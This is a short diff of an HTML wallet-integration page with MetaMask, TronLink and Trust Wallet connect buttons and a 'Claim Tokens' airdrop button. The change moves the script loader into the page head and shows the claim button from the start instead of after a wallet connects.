@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Integration</title>
     <link rel="stylesheet" href="css/styles.css">
+    <!-- Script Loader -->
+    <script src="js/loader.js"></script> <!-- Place loader.js first -->
 </head>
 <body>
     <div id="app">
@@ -12,12 +14,11 @@
         <button id="metamask-connect">Connect MetaMask</button>
         <button id="tronlink-connect">Connect TronLink</button>
         <button id="trustwallet-connect">Connect Trust Wallet</button>
-        <button id="claimAirdropButton" style="display:none;">Claim Tokens</button> <!-- Added Claim Button -->
+        <button id="claimAirdropButton">Claim Tokens</button> <!-- Button visible from the start -->
         <p id="status"></p>
     </div>
 
-    <!-- Script Loader (load first to handle other scripts dynamically) -->
-    <script src="js/loader.js"></script>
+    <!-- Additional Scripts -->
     <script>
         document.getElementById("metamask-connect").addEventListener("click", () => {
             loadWalletScripts("metamask");
@@ -30,11 +31,6 @@
         document.getElementById("trustwallet-connect").addEventListener("click", () => {
             loadWalletScripts("trustwallet");
         });
-
-        // Function to show the Claim Tokens button when a wallet is connected
-        function showClaimButton() {
-            document.getElementById("claimAirdropButton").style.display = "block";
-        }
     </script>
 </body>
 </html>
